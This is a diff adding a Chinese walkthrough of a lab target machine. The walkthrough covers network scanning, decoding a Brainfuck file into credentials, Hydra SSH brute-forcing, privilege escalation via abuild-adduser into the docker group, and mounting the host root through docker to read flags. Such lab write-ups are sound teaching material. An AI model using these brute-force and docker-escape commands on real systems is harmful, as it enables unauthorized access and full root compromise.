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-->
-<!--/encrypt-->
+# 一、信息收集
+
+使用 `arp-scan` 扫描本地网络，发现目标主机：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.153 08:00:27:b6:8c:d1       PCS Systemtechnik GmbH
+...
+```
+
+对目标主机进行端口扫描：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.153
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 12:56 GMT
+Nmap scan report for 192.168.205.153
+Host is up (0.00027s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:B6:8C:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+**端口分析：**
+
+- 22/tcp: SSH 服务
+- 80/tcp: HTTP 服务（运行 NexusPHP 1.9.6 论坛）
+- 8080/tcp: NoVNC 服务
+
+# 二、服务探测
+
+访问 80 端口发现是 NexusPHP 1.9.6 版本的 CMS 论坛，这是最新版本，暂未发现可利用漏洞。
+
+8080 端口运行 NoVNC 服务，可以通过浏览器连接到一个 Docker 容器的 VNC 桌面环境。
+
+# 三、关键信息获取
+
+在 VNC 环境的根目录下发现一个名为 `secret` 的文件，内容为 Brainfuck 语言编写的代码。由于 NoVNC 环境的复制粘贴功能存在限制，需要特殊方法来处理这个文件。
+
+> [!Tip]
+>
+> https://github.com/alew140/stupid-NoVNC-copy-paste/tree/main
+>
+> 我用不了，我叫ai改了一下
+
+## 3.1 NoVNC 复制粘贴解决方案
+
+使用修改过的 JavaScript 脚本来解决 NoVNC 的复制粘贴问题：
+
+```javascript
+class VNCPaste {
+    constructor(config = {}) {
+        this.config = {
+            selector: '#noVNC_canvas',
+            fallbackSelector: 'canvas',
+            baseDelay: 80,
+            specialDelay: 160,
+            enableLogging: true,
+            middleClickEnabled: true,
+            ...config
+        };
+        this.canvas = null;
+        this.isInitialized = false;
+        const shiftPairs = {
+            '~': '`', '!': '1', '@': '2', '#': '3', '$': '4',
+            '%': '5', '^': '6', '&': '7', '*': '8', '(': '9',
+            ')': '0', '_': '-', '+': '=', '{': '[', '}': ']',
+            '|': '\\', ':': ';', '"': "'", '<': ',', '>': '.',
+            '?': '/'
+        };
+        this.specialKeys = new Map(
+            Object.entries(shiftPairs).map(([sym, base]) => [sym, { key: base, shiftKey: true }])
+        );
+    }
+    log(...args) { if (this.config.enableLogging) console.log('[VNCPaste]', ...args); }
+    error(...args) { console.error('[VNCPaste]', ...args); }
+    findCanvas() {
+        this.canvas = document.querySelector(this.config.selector) ||
+                      document.querySelector(this.config.fallbackSelector);
+        if (!this.canvas) throw new Error('Canvas not found');
+        return this.canvas;
+    }
+    createKeyboardEvent(type, key, options = {}) {
+        return new KeyboardEvent(type, {
+            key,
+            keyCode: key.charCodeAt(0),
+            charCode: key.charCodeAt(0),
+            which: key.charCodeAt(0),
+            bubbles: true,
+            ...options
+        });
+    }
+    async sendKeyboardEvents(char) {
+        const mapping = this.specialKeys.get(char);
+        let keyInfo = mapping 
+            ? mapping 
+            : /[A-Z]/.test(char) ? { key: char, shiftKey: true } : { key: char, shiftKey: false };
+        const delay = mapping ? this.config.specialDelay : this.config.baseDelay;
+        for (const ev of ['keydown', 'keypress', 'keyup']) {
+            await new Promise(res => {
+                setTimeout(() => {
+                    this.canvas.dispatchEvent(
+                        this.createKeyboardEvent(ev, char, { shiftKey: keyInfo.shiftKey })
+                    );
+                    this.log(`发送 ${ev}: '${char}' (shift=${keyInfo.shiftKey})`);
+                    res();
+                }, 10);
+            });
+        }
+        await new Promise(res => setTimeout(res, delay));
+    }
+    async sendString(text) {
+        if (!this.canvas) return this.error('Canvas not initialized');
+        this.canvas.focus();
+        await new Promise(res => setTimeout(res, 200));
+        for (let i = 0; i < text.length; i++) {
+            try { await this.sendKeyboardEvents(text[i]); }
+            catch (e) { this.error(`字符 '${text[i]}' 出错:`, e); }
+        }
+        this.log("发送完毕");
+    }
+    async showCustomInputBox() {
+        return new Promise(resolve => {
+            let overlay = document.createElement('div');
+            Object.assign(overlay.style, {
+                position: 'fixed', top: 0, left: 0, width: '100%', height: '100%',
+                background: 'rgba(0,0,0,0.6)', display: 'flex',
+                alignItems: 'center', justifyContent: 'center', zIndex: 9999
+            });
+            let box = document.createElement('div');
+            Object.assign(box.style, {
+                background: '#fff', padding: '20px', borderRadius: '8px',
+                display: 'flex', flexDirection: 'column', minWidth: '300px'
+            });
+            let textarea = document.createElement('textarea');
+            textarea.rows = 4; textarea.style.width = '100%';
+            textarea.placeholder = '粘贴要发送的内容...';
+            let btn = document.createElement('button');
+            btn.textContent = '发送'; btn.style.marginTop = '10px';
+            btn.onclick = () => { document.body.removeChild(overlay); resolve(textarea.value); };
+            box.appendChild(textarea); box.appendChild(btn); overlay.appendChild(box);
+            document.body.appendChild(overlay); textarea.focus();
+        });
+    }
+    async handleMiddleClick(e) {
+        if (e.button === 1 && this.config.middleClickEnabled) {
+            e.preventDefault();
+            this.canvas.focus();
+            let text = await this.showCustomInputBox();
+            if (text) await this.sendString(text);
+        }
+    }
+    init() {
+        if (this.isInitialized) return this.error('Already initialized');
+        this.findCanvas();
+        this.canvas.addEventListener('mouseup', this.handleMiddleClick.bind(this));
+        this.canvas.addEventListener('contextmenu', e => e.preventDefault());
+        window.sendString = this.sendString.bind(this);
+        this.isInitialized = true;
+        this.log('VNCPaste 中键触发版已初始化');
+    }
+    destroy() {
+        if (!this.isInitialized) return;
+        this.canvas.removeEventListener('mouseup', this.handleMiddleClick.bind(this));
+        delete window.sendString;
+        this.isInitialized = false;
+        this.log('销毁完成');
+    }
+}
+const vncPaste = new VNCPaste();
+vncPaste.init();
+```
+
+中键触发（控制台输入加载）
+
+## 3.2 Brainfuck 解释器
+
+创建 Python 脚本解析 Brainfuck 代码：
+
+```python
+cd 
+cat > bf.py << 'EOF'
+#!/usr/bin/env python3
+class BfInterpreter:
+    def __init__(self):
+        self.mem = [0] * 30000
+        self.ptr = 0
+        self.code_ptr = 0
+        self.input_buf = []
+        self.output_buf = []
+        
+    def run(self, code, input_data=""):
+        self.reset()
+        self.input_buf = list(input_data.encode())
+        code = ''.join(c for c in code if c in '><+-.,[]')
+        self.code = code
+        
+        while self.code_ptr < len(code):
+            cmd = code[self.code_ptr]
+            
+            if cmd == '>':
+                self.ptr = (self.ptr + 1) % 30000
+            elif cmd == '<':
+                self.ptr = (self.ptr - 1) % 30000
+            elif cmd == '+':
+                self.mem[self.ptr] = (self.mem[self.ptr] + 1) % 256
+            elif cmd == '-':
+                self.mem[self.ptr] = (self.mem[self.ptr] - 1) % 256
+            elif cmd == '.':
+                self.output_buf.append(chr(self.mem[self.ptr]))
+            elif cmd == ',':
+                if self.input_buf:
+                    self.mem[self.ptr] = self.input_buf.pop(0)
+                else:
+                    self.mem[self.ptr] = 0
+            elif cmd == '[':
+                if self.mem[self.ptr] == 0:
+                    self.jump_forward()
+            elif cmd == ']':
+                if self.mem[self.ptr] != 0:
+                    self.jump_backward()
+                    
+            self.code_ptr += 1
+            
+        return ''.join(self.output_buf)
+    
+    def jump_forward(self):
+        bracket_count = 1
+        while bracket_count > 0 and self.code_ptr < len(self.code) - 1:
+            self.code_ptr += 1
+            if self.code[self.code_ptr] == '[':
+                bracket_count += 1
+            elif self.code[self.code_ptr] == ']':
+                bracket_count -= 1
+    
+    def jump_backward(self):
+        bracket_count = 1
+        while bracket_count > 0 and self.code_ptr > 0:
+            self.code_ptr -= 1
+            if self.code[self.code_ptr] == ']':
+                bracket_count += 1
+            elif self.code[self.code_ptr] == '[':
+                bracket_count -= 1
+    
+    def reset(self):
+        self.mem = [0] * 30000
+        self.ptr = 0
+        self.code_ptr = 0
+        self.output_buf = []
+if __name__ == "__main__":
+    bf = BfInterpreter()
+    
+    try:
+        with open('/secret', 'r') as f:
+            code = f.read()
+        result = bf.run(code)
+        print(result)
+    except:
+        print("Interactive mode:")
+        while True:
+            try:
+                code = input("BF> ")
+                if code == 'quit':
+                    break
+                result = bf.run(code)
+                if result:
+                    print(result)
+            except KeyboardInterrupt:
+                break
+EOF
+python3 bf.py
+
+```
+
+执行后得到解码结果：
+
+```
+lilix:32691ca63c0677d0394b7e746569423c
+```
+
+# 四、权限获取
+
+## 4.1 论坛登录问题绕过
+
+尝试使用获得的凭据登录论坛时，发现用户因长期未登录被封禁。采用以下方法绕过：
+
+1. 关闭靶机并重新部署
+2. 断开靶机网络连接
+3. 将宿主机日期调整到 2025年9月之前
+4. 重启靶机并尝试登录
+
+## 4.2 种子信息分析
+
+成功登录论坛后，在首页发现有两个"坏种"提示。在字幕页提示种子的地址是以`http://192.168.245.132/details.php?id=`的格式，通过 Burp Suite 爆破种子ID，发现：
+
+- 种子4：`id_rsa`（暂时无用）
+- 种子5：`pass.txt`（重点关注）
+
+**种子下载分析：**
+使用种子下载工具（如 Motrix）打开种子5，发现 `pass.txt` 文件大小仅为 11 B。
+
+## 4.3 密码破解
+
+基于文件大小为 11 B的线索，从2020佬常用密码字典中提取相同长度的密码：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ awk 'length($0)==11' xato-net-10-million-passwords.txt > pass
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ wc -l pass       
+236238 pass
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ hydra -l lilix -P pass ssh://192.168.205.160 -f -I -t 10
+...
+[22][ssh] host: 192.168.205.160   login: lilix   password: bladerunner
+...
+```
+
+**注意：** 使用 rockyou.txt 字典效果更差，`bladerunner` 在其中排名第 1104 位。
+
+# 五、权限提升
+
+## 5.1 SSH 登录
+
+使用破解得到的凭据登录 SSH：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh lilix@192.168.205.160
+lilix@192.168.205.160's password: bladerunner
+
+transmission:~$ id
+uid=1000(lilix) gid=1000(lilix) groups=300(abuild),1000(lilix)
+
+transmission:~$ find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
+---s--x--x    1 root     root         14224 Jan 18  2025 /bin/bbsuid
+-r-sr-xr-x    1 root     root         14224 Jan  4  2025 /usr/bin/abuild-sudo
+-rwsr-xr-x    1 root     root         69648 Feb 14  2025 /sbin/apk
+```
+
+## 5.2 利用 abuild-sudo 提权
+
+- `abuild-sudo` 是Alpine Linux包构建系统的一部分
+- 设计初衷：允许 `abuild` 组成员以root权限执行特定构建任务
+- **漏洞**：权限检查不够严格，可以创建用户并分配任意组
+
+```bash
+transmission:~$ /usr/bin/abuild-adduser test -G docker
+Changing password for test
+New password: 1
+Bad password: too short
+Retype password: 1
+passwd: password for test changed by root
+
+transmission:~$ su test
+Password: 1
+```
+
+## 5.3 Docker 容器逃逸
+
+利用 Docker 组权限挂载主机根目录，实现容器逃逸：
+
+```bash
+/home/lilix $ docker run -v /:/mnt --rm -it --entrypoint="" $(docker images -q | head -1) /bin/bash
+
+root@a8bd7177e2a2:/# cd mnt/
+root@a8bd7177e2a2:/mnt# cat root/R007.F1A9 home/lilix/user.flag 
+flag{146be38677f379dabf37c7c4ccc386cd}
+flag{93b1224cd1be328c27fbd951cb4cc903}
+```
